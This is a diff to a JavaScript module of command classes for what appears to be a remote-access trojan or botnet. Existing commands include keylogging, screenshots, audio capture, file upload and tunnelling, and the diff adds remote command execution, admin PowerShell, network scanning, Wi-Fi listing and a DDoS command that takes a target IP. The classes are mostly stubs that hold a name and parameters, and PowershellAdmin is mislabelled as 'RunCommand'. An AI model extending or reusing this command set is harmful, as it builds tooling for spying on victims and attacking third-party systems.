@@ -105,4 +105,61 @@ class AudioCapture extends Command {
      }
  }
 
-module.exports = {Command,NetworkMove, GetKeyboardData, Idle, Ping, Announce, Screenshot, GetSysInfo, UploadFile, GetPublicIp, GetPrivateIp, AudioCapture, InstallTunnel, OpenTunnel }
+ class InstallPython extends Command {
+    constructor(props) {
+        super(props)
+        this.name = "InstallPython"
+    }
+ }
+
+ class RunCommand extends Command {
+     constructor(props) {
+         super(props)
+         this.name = "RunCommand"
+         this.command = props.command
+     }
+ }
+
+ class PowershellAdmin extends Command {
+     constructor(props) {
+         super(props)
+         this.name = "RunCommand"
+         this.command = props.command
+     }
+ }
+
+ class NetworkScan extends Command {
+     constructor(props) {
+         super(props)
+         this.name = "NetworkScan"
+     }
+ }
+ class Ddos extends Command {
+        constructor(props) {
+            super(props)
+            this.name = "Ddos"
+            this.targetIp = props.targetIp
+        }
+ }
+ class WifiList extends Command {
+        constructor(props) {
+            super(props)
+            this.name = "WifiList"
+        }
+ }
+ class SetPullingRate extends Command {
+        constructor(props) {
+            super(props)
+            this.name = "SetPullingRate"
+            this.rate = props.rate
+        }
+ }
+ class Gateway extends Command {
+        constructor(props) {
+            super(props)
+            this.name = "Gateway"
+        }
+ }
+
+
+module.exports = {Command, RunCommand, NetworkScan, PowershellAdmin, NetworkMove, GetKeyboardData, Idle, Ping, Announce, Screenshot, GetSysInfo, UploadFile, GetPublicIp, GetPrivateIp, AudioCapture, InstallTunnel, OpenTunnel, InstallPython }
